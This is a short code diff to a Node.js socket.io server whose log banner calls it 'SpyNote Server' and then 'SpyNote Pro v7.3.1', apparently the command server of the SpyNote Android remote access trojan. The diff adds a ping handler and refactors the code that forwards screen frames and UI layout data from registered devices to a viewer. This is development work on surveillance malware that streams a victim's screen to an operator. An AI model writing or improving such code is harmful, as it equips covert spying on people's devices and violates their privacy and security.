@@ -34,6 +34,8 @@ app.get('/devices', (req, res) => {
 });
 
 io.on('connection', (socket) => {
+    socket.on('ping', () => socket.emit('pong'));
+    
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
         if (deviceId) {
@@ -48,19 +50,20 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 FIXED - Always Forward Layout Data
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('screen-update', {
+            // 🔥 ALWAYS SEND LAYOUT - Critical Fix
+            const frameData = {
                 deviceId,
                 data: data.data,
                 width: data.width,
                 height: data.height,
                 timestamp: data.timestamp,
-                layout: data.layout || [], // 🔥 Always send array
+                layout: data.layout || [], // Always include layout
                 fps: data.fps
-            });
+            };
+            socket.to(deviceId).emit('screen-update', frameData);
         }
     });
 
@@ -92,5 +95,5 @@ io.on('connection', (socket) => {
 });
 
 server.listen(process.env.PORT || 3000, () => {
-    console.log('🚀 SpyNote Server running on port 3000!');
+    console.log('🚀 SpyNote Pro v7.3.1 running on port 3000!');
 });
